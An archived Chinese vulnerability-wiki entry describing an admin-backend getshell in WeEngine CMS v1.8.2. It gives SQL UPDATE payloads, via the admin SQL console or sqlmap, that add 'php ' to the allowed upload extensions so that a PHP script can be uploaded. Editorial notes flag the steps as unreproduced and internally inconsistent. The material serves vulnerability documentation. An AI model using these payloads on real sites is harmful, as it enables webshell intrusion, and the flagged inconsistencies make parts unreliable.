---
source: "hatch 补库批 20260928"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
title: "微擎cms v1.8.2 后台getshell"
product: "微擎CMS1.8.2"
record_type: "unknown"
document_type: "技术文章（细分类待核）"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "需高权执行SQL/调试模式或另SQLi+上传权限，不是普通后台即RCE；保留具体201812130002版本及原来源"
side_effects: "原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96%E8%BD%AF%E4%BB%B6/%E6%9D%82%E9%A1%B9/%E5%BE%AE%E6%93%8Ecms%20v1.8.2%20%E5%90%8E%E5%8F%B0getshell.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "missing"
source_note: "原始出处待补；仓库归档不等同原始披露"
id: "vw-75fd18554352ff8f5edc03aa"
entity_id: "ve-75fd18554352ff8f5edc03aa"
schema_version: "1"
---

# 微擎cms v1.8.2 后台getshell

<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：微擎CMS1.8.2
- 文献类型：技术文章（细分类待核）
- 版本、权限及部署边界：需高权执行SQL/调试模式或另SQLi+上传权限，不是普通后台即RCE；保留具体201812130002版本及原来源
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. 需高权执行SQL/调试模式或另SQLi+上传权限，不是普通后台即RCE
2. UPDATE replace缺WHERE可改全部配置
3. s:3写php空格实际4字节，未解释是否利用损坏反序列化机制，需原始核而非直接复用
4. 头段说php入库但展示只图片扩展自矛盾
5. 改配置清缓存上传脚本均需恢复
6. 保留具体201812130002版本及原来源

### 操作风险

原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原始披露 URL 未确认；既有归档来源标签保留，不能替代原始公告

### 归档技术正文

一、漏洞简介
------------

二、漏洞影响
------------

v1.8.2（201812130002）

三、复现过程
------------

站点-附件设置-支持文件后缀

![](./.resource/微擎cmsv1.8.2后台getshell/media/rId24.png)

在安装完成的时候,数据库里面并没有写入支持文件后缀的值,需要我们进行添加需要的脚本格式php等等

![](./.resource/微擎cmsv1.8.2后台getshell/media/rId25.png)

直接写上支持的后缀为php是会带入到数据库的,提交完毕以后数据库会显示可上传的值

    a:3:{s:16:"attachment_limit";  
    i:0;s:5:"image";a:5:{s:5:"thumb";i:0;s:5:  
    "width";i:800;s:10:"extentions";  
    a:4:{i:0;s:3:"gif";i:1;s:3:"jpg";i:2;s:4:"jpeg";i:3;s:3:"png";}  
    s:5:"limit";i:5000;s:14:"zip_percentage";s:3:"100";}  
    s:5:"audio";a:2:{s:10:"extentions";a:1:{i:0;s:3:"mp3";}s:5:"limit";i:5000;}}

### 漏洞利用

写入任意字符

![](./.resource/微擎cmsv1.8.2后台getshell/media/rId27.png)

    a:3:{s:16:"attachment_limit";i:0;s:5:"image";  
    a:5:{s:5:"thumb";i:0;s:5:"width";i:800;s:10:"extentions";  
    a:5:{i:0;s:3:"gif";i:1;s:3:"jpg";i:2;s:4:"jpeg";i:3;  
    s:3:"png";i:4;s:3:"aaa";}s:5:"limit";i:5000;
    s:14:"zip_percentage";s:3:"100";}s:5:"audio";  
    a:2:{s:10:"extentions";  a:1:{i:0;s:3:"mp3";}s:5:"limit";i:5000;}}

站点-常用工具-数据库-执行SQL语句替换之前插入的值 (记得打开调试模式)

    UPDATE ims_core_settings SET value = replace(value, 'aaa', 'php ')

注意php后有一个空格

or 如果在渗透过程中有SQL注入点的情况下
有用户权限能够上传,尝试直接在SQLMAP执行语句

    UPDATE `ims_core_settings` SET
    `key` = 'upload',
    `value` = 'a:2:{s:5:\"image\";a:4:{s:5:\"thumb\";i:0;  
    s:5:\"width\";i:800;s:10:\"extentions\";  
    a:5:{i:0;s:3:\"gif\";i:1;s:3:\"jpg\";i:2;  
    s:4:\"jpeg\";i:3; s:3:\"png\";i:4;s:3:\"php \";}  
    s:5:\"limit\";i:5000;}s:5:\"audio\";  
    a:2:{s:10:\"extentions\";a:1:{i:0;s:3:\"mp3\";}s:5:\"limit\";i:5000;}}'
    WHERE `key` = 'upload' AND `key` = 'upload' COLLATE utf8mb4_bin;

![](./.resource/微擎cmsv1.8.2后台getshell/media/rId28.png)

    a:3:{s:16:"attachment_limit";i:0;s:5:"image";  
    a:5:{s:5:"thumb";i:0;s:5:"width";i:800;s:10:"extentions";  
    a:5:{i:0;s:3:"gif";i:1;s:3:"jpg";i:2;s:4:"jpeg";i:3;  
    s:3:"png";i:4;s:3:"php ";}s:5:"limit";i:5000;  
    s:14:"zip_percentage";s:3:"100";}s:5:"audio";  
    a:2:{s:10:"extentions";a:1:{i:0;s:3:"mp3";}s:5:"limit";i:5000;}}

执行完毕-系统-更新缓存

![](./.resource/微擎cmsv1.8.2后台getshell/media/rId29.png)

### 上传php文件

以上全部操作完毕,直接在可以上传图片的地方进行上传脚本

![](./.resource/微擎cmsv1.8.2后台getshell/media/rId31.png)

四、参考链接
------------

> <https://www.vulnbug.com/Exploit/getshell-vulnerability-in-microcomputer-cms-background.html>
